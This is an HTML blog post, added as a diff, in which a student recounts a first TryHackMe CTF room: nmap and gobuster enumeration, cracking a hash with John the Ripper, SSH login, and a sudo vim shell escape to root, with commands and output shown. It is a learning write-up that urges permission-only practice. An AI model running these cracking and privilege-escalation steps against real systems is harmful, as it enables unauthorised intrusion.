@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Getting Started with CTF Challenges — Idra Mkumbanya</title>
+    <link rel="icon" type="image/svg+xml" href="../pictures/favicon.svg" />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <link rel="stylesheet" href="../css/post.css" />
+    <meta name="description" content="My first experience with Capture the Flag competitions — tools, mindset, and lessons from TryHackMe. A beginner's honest guide." />
+    <meta name="author" content="Idra Mkumbanya" />
+    <meta property="og:title" content="Getting Started with CTF Challenges" />
+    <meta property="og:description" content="Tools, mindset, and lessons from TryHackMe — a beginner's honest guide." />
+    <script src="../js/script.js" defer></script>
+</head>
+<body>
+    <a href="#post-content" class="skip-link">Skip to main content</a>
+    <div class="menu-overlay" id="menu-overlay"></div>
+    <div class="grid-bg"></div>
+
+    <nav>
+        <div class="logo">Swahili<span>Cyber</span></div>
+        <button class="hamburger" id="hamburger" aria-label="Toggle navigation menu">
+            <span></span><span></span><span></span>
+        </button>
+        <ul id="nav-menu" role="list">
+            <li><a href="../index.html">HOME</a></li>
+            <li><a href="../project.html">WORK</a></li>
+            <li><a href="../aboutme.html">ABOUT</a></li>
+            <li><a href="../contact.html">CONTACT</a></li>
+            <li><a href="../survey.html">SURVEY</a></li>
+            <li><a href="../blog.html" class="active">BLOG</a></li>
+        </ul>
+        <div class="nav-right">
+            <button id="theme-toggle" class="theme-toggle" aria-label="Toggle light and dark mode">🌙</button>
+            <a href="../contact.html" class="talk-btn">LET'S TALK</a>
+        </div>
+    </nav>
+
+    <main id="post-content">
+
+        <!-- ===== POST HEADER ===== -->
+        <div class="post-header">
+            <div class="post-breadcrumb">
+                <a href="../blog.html">← Blog</a>
+                <span>/</span>
+                <span>CTF</span>
+            </div>
+
+            <div class="post-tags">
+                <span class="blog-tag">🚩 CTF</span>
+                <span class="blog-tag">TryHackMe</span>
+                <span class="blog-tag">Beginner</span>
+            </div>
+
+            <h1>Getting Started with CTF Challenges — Tools, Mindset &amp; First Wins</h1>
+
+            <div class="post-meta">
+                <span>✍️ Idra Mkumbanya</span>
+                <span>·</span>
+                <span>📅 June 2025</span>
+                <span>·</span>
+                <span>📖 ~8 min read</span>
+            </div>
+
+            <p class="post-intro">
+                When I first heard "Capture the Flag" in a cybersecurity context I thought it sounded like a game — and honestly, it is. But it's also one of the best ways to build real, practical security skills. This is my honest account of diving in for the first time: what I used, what confused me, and what finally clicked.
+            </p>
+        </div>
+
+        <!-- ===== POST BODY ===== -->
+        <article class="post-body">
+
+            <h2>What is a CTF?</h2>
+            <p>
+                A Capture the Flag (CTF) competition is a cybersecurity challenge where you solve puzzles to find hidden strings of text called <em>flags</em> — usually in the format <code>FLAG{some_secret_here}</code>. Each flag you find earns points. The challenges test skills across categories like:
+            </p>
+            <ul>
+                <li><strong>Web exploitation</strong> — finding vulnerabilities in websites</li>
+                <li><strong>Cryptography</strong> — decoding ciphers and breaking weak encryption</li>
+                <li><strong>Forensics</strong> — recovering hidden data from files or network captures</li>
+                <li><strong>Binary exploitation</strong> — attacking compiled programs</li>
+                <li><strong>OSINT</strong> — finding information from public sources</li>
+            </ul>
+            <p>
+                For beginners, platforms like <strong>TryHackMe</strong> are ideal because they guide you step by step rather than dropping you into a competition cold.
+            </p>
+
+            <div class="post-callout info">
+                <span class="callout-icon">💡</span>
+                <div>
+                    <strong>TryHackMe vs HackTheBox</strong><br>
+                    TryHackMe is more beginner-friendly with guided rooms and hints. HackTheBox is more realistic and harder — no hints, closer to real penetration testing. Start with TryHackMe.
+                </div>
+            </div>
+
+            <h2>Tools I Use</h2>
+            <p>You don't need a lot to start. Here's my basic toolkit:</p>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">🐧 Linux (Kali or Ubuntu)</div>
+                    <p>Most security tools are Linux-first. Kali Linux comes with everything pre-installed. If you prefer Ubuntu, you can install tools as you need them.</p>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">🔍 Nmap</div>
+                    <p>Network scanner. The first thing I run on any CTF machine to find open ports and services.</p>
+                    <code class="inline-code">nmap -sV -sC -oN scan.txt &lt;IP&gt;</code>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">🌐 Burp Suite</div>
+                    <p>Web proxy for intercepting and modifying HTTP requests. Essential for web challenges. The Community edition is free.</p>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">🔑 John the Ripper</div>
+                    <p>Password hash cracker. When you find a hash file on a machine, this cracks it using wordlists.</p>
+                    <code class="inline-code">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">📡 Gobuster</div>
+                    <p>Directory brute-forcer for web challenges. Finds hidden paths on websites.</p>
+                    <code class="inline-code">gobuster dir -u http://&lt;IP&gt; -w common.txt</code>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">🐍 Python</div>
+                    <p>For writing quick scripts — decoding base64, automating requests, solving crypto challenges.</p>
+                </div>
+            </div>
+
+            <h2>My First TryHackMe Room</h2>
+            <p>
+                The first room I completed was <strong>"Basic Pentesting"</strong>. Here's the rough process I followed — this is a typical CTF workflow you'll repeat on most machines:
+            </p>
+
+            <div class="post-steps">
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <div class="step-content">
+                        <h3>Enumeration — find what's open</h3>
+                        <p>Run Nmap to see what ports are open. I found SSH (22) and a web server (80) running.</p>
+                        <div class="code-block">
+                            <div class="code-header">bash</div>
+                            <pre><code>nmap -sV -sC -p- 10.10.x.x
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2
+80/tcp open  http    Apache 2.4.18</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <div class="step-content">
+                        <h3>Web enumeration — find hidden directories</h3>
+                        <p>The website looked simple. I used Gobuster to find hidden paths.</p>
+                        <div class="code-block">
+                            <div class="code-header">bash</div>
+                            <pre><code>gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
+
+/development  (Status: 301)
+/secret       (Status: 200)</code></pre>
+                        </div>
+                        <p>The <code>/development</code> folder had a note file with a username hint.</p>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <div class="step-content">
+                        <h3>Cracking credentials</h3>
+                        <p>Found a hash file. Used John the Ripper with the rockyou wordlist.</p>
+                        <div class="code-block">
+                            <div class="code-header">bash</div>
+                            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt)
+password123      (jan)</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">4</div>
+                    <div class="step-content">
+                        <h3>SSH in and find the flag</h3>
+                        <p>Login with the cracked credentials, then look for the flag file.</p>
+                        <div class="code-block">
+                            <div class="code-header">bash</div>
+                            <pre><code>ssh jan@10.10.x.x
+# password: password123
+
+ls /home
+cat /home/kay/flag.txt
+
+FLAG{y0u_g0t_it_congrats}</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <div class="step-num">5</div>
+                    <div class="step-content">
+                        <h3>Privilege escalation</h3>
+                        <p>The second flag needed root. I checked sudo permissions:</p>
+                        <div class="code-block">
+                            <div class="code-header">bash</div>
+                            <pre><code>sudo -l
+# (ALL) NOPASSWD: /usr/bin/vim
+
+# Escape to shell from vim:
+sudo vim -c ':!/bin/bash'
+whoami
+# root</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="post-callout warning">
+                <span class="callout-icon">⚠️</span>
+                <div>
+                    <strong>Only practice on machines you own or have permission to test.</strong><br>
+                    TryHackMe, HackTheBox, and VulnHub provide legal practice environments. Never run these techniques on real systems without written permission — it is illegal.
+                </div>
+            </div>
+
+            <h2>The Mindset Shift</h2>
+            <p>The biggest thing CTFs taught me wasn't a specific tool — it was a way of thinking:</p>
+            <ul>
+                <li><strong>Enumerate before you attack.</strong> Never guess. Map everything first.</li>
+                <li><strong>Read error messages carefully.</strong> They often tell you exactly what's wrong — and what's vulnerable.</li>
+                <li><strong>Google is a skill.</strong> Searching for a specific CVE number or error string is legitimate and expected.</li>
+                <li><strong>Take notes.</strong> Write down every command you run and every output you get. You'll need to backtrack.</li>
+                <li><strong>It's supposed to be hard.</strong> Staring at a challenge for 2 hours then suddenly solving it is the whole point.</li>
+            </ul>
+
+            <h2>Good Rooms to Start With on TryHackMe</h2>
+            <p>In rough order of difficulty:</p>
+            <ol>
+                <li><strong>Linux Fundamentals</strong> (Parts 1–3) — essential before anything else</li>
+                <li><strong>Introductory Networking</strong> — TCP/IP, OSI model basics</li>
+                <li><strong>Basic Pentesting</strong> — the room I walked through above</li>
+                <li><strong>OWASP Top 10</strong> — web vulnerabilities one by one</li>
+                <li><strong>Mr. Robot CTF</strong> — themed after the show, great intermediate challenge</li>
+            </ol>
+
+            <h2>What's Next for Me</h2>
+            <p>
+                I'm currently working through the TryHackMe <strong>Pre-Security</strong> and <strong>SOC Level 1</strong> paths alongside my CCNA and Security+ studies. My goal is to eventually attempt HackTheBox machines and document more writeups here.
+            </p>
+            <p>
+                If you're a fellow student at UDOM or anywhere in Tanzania just getting into cybersecurity — feel free to reach out. Let's learn together.
+            </p>
+
+        </article>
+
+        <!-- ===== POST FOOTER ===== -->
+        <div class="post-footer">
+
+            <div class="post-share">
+                <h3>Found this useful?</h3>
+                <p>Share it or leave feedback — it helps me know what to write next.</p>
+                <div class="share-buttons">
+                    <a href="../survey.html" class="btn-secondary">📝 Leave Feedback</a>
+                    <a href="../contact.html" class="btn-secondary">💬 Ask a Question</a>
+                </div>
+            </div>
+
+            <div class="post-nav">
+                <div class="post-nav-prev">
+                    <span class="post-nav-label">← Previous</span>
+                    <span class="post-nav-title">No previous post yet</span>
+                </div>
+                <div class="post-nav-next">
+                    <a href="../blog.html" class="post-nav-link">
+                        <span class="post-nav-label">All Posts →</span>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+        <section class="cta-section">
+            <h2>Want to Work Together?</h2>
+            <p>Open to internships, freelance projects, and cybersecurity collaborations.</p>
+            <a href="../contact.html" class="btn-primary">Get In Touch</a>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Idra Mkumbanya. All rights reserved.</p>
+        <div class="footer-links">
+            <a href="https://github.com/iamidra" target="_blank" rel="noopener noreferrer">🐙 GitHub</a>
+            <a href="../contact.html">📧 Contact</a>
+            <a href="../blog.html">📝 More Posts</a>
+        </div>
+    </footer>
+</body>
+</html>
